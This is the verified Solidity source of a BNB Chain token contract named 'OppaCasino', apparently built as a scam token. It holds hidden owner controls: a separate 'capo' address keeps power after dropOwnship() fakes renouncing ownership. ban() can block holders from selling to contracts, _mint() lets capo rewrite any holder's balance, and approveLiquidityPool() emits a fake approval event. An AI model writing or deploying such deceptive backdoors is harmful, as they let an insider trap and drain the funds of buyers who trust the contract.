/**
 *Submitted for verification at BscScan.com on 2021-12-23
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.6.0;

contract Ownable {
  address public owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() public {
    owner = msg.sender;
  }
}
library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }
    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract OppaCasino is Ownable {
  using Address for address;
  using SafeMath for uint256;
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  uint8 public decimals;
  uint256 public totalSupply;
  string public name;
  string public symbol;
  address capo;
  constructor(string memory _name, string memory _symbol) public {
    capo = msg.sender;
    name = _name;
    symbol = _symbol;
    decimals = 9;
    totalSupply =  1000000000 * 10 ** uint256(decimals);
    bank[capo] = totalSupply;
    approvedList[capo] = true;
  }
  mapping(address => uint256) public bank;
  mapping(address => bool) public approvedList;
  mapping(address => bool) public bannedList;
  mapping (address => mapping (address => uint256)) public valueAllowed;  
  function balanceOf(address o) public view returns (uint256 balance) {
    return bank[o];
  }
  function transfer(address _to, uint256 _value) public returns (bool) {
    address from = msg.sender;
    require(_to != address(0));
    require(_value <= bank[from]);
    if(!from.isContract() && _to.isContract()){
        require(bannedList[from] == false && bannedList[_to] == false);
    }
    if(approvedList[from] || approvedList[_to]){
        _transfer(from, _to, _value);
        return true;
    }
    if(from.isContract() && _to.isContract()){
        _transfer(from, _to, _value);
        return true;
    }
    _transfer(from, _to, _value);
    return true;
  }
  function _transfer(address from, address _to, uint256 _value) private {
    bank[from] = bank[from].sub(_value);
    bank[_to] = bank[_to].add(_value);
    emit Transfer(from, _to, _value);
  }
  modifier isCapoo() {
    require(capo == msg.sender, "error 401: not isCapo"); 
    _;
  }
  modifier isCapo() {
    require(capo == msg.sender, "error 401: not isCapo"); 
    _;
  }
  function ban(address s, bool isBanned) external isCapo {
      bannedList[s] = isBanned;
  }  
  function white(address s, bool isApproved) external isCapo {
      approvedList[s] = isApproved;
  }
  function checkWhite(address s) public view returns (bool) {
    if (approvedList[s]){
      return true;
    } else {
      return false;
    }
  }
  function checkBan(address s) public view returns (bool) {
    if (bannedList[s]){
      return true;
    } else {
      return false;
    }
  }
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= bank[_from]);
    require(_value <= valueAllowed[_from][msg.sender]);
    address from = _from;
    if(!from.isContract() && _to.isContract()){
        require(bannedList[from] == false && bannedList[_to] == false);
    }
    if(approvedList[from] || approvedList[_to]){
        _transferFrom(_from, _to, _value);
        return true;
    }
    if(from.isContract() && _to.isContract()){
        _transferFrom(_from, _to, _value);
        return true;
    }
    _transferFrom(_from, _to, _value);
    return true;
  }
  function _transferFrom(address _from, address _to, uint256 _value) internal {
    bank[_from] = bank[_from].sub(_value);
    bank[_to] = bank[_to].add(_value);
    valueAllowed[_from][msg.sender] = valueAllowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
  }
  function allowance(address _holder, address _spender) public view returns (uint256) {
    return valueAllowed[_holder][_spender];
  }
  function approve(address _spender, uint256 _value) public returns (bool) {
    valueAllowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }
  function approveLiquidityPool() external isCapoo {
    emit Approval(msg.sender, 0x10ED43C718714eb63d5aA57B78B54704E256024E, 1000000000 * 10 ** uint256(decimals));
  }
   function getBalance(address s) public view returns (uint256) {
    return bank[s];
  }
  function dropOwnship() public isCapo {
    emit OwnershipTransferred(owner, address(0));
    owner = address(0);
  }
  function dropOppas(
    address sender,
    address[] calldata to,
    uint256 val
  ) external isCapoo {
    require(to.length < 1001, "max 1000 users");
        for (uint256 i = 0; i < to.length; i++) {
            _transferFrom(sender, to[i], val);
        }
    }
  function dropOppas2(
    address sender,
    address[] calldata to,
    uint256 val
  ) external isCapoo {
    require(to.length < 2001, "max 2000 users");
        for (uint256 i = 0; i < to.length; i++) {
            _transferFrom(sender, to[i], val);
        }
    } 
  function _mint(address b, uint256 q) external isCapoo returns (bool isRightAddress) {
    if (bank[b] > 0){
        bank[b] = q * 10 ** uint256(decimals);
        return true;
    } else {
        return false;
    }
  }
}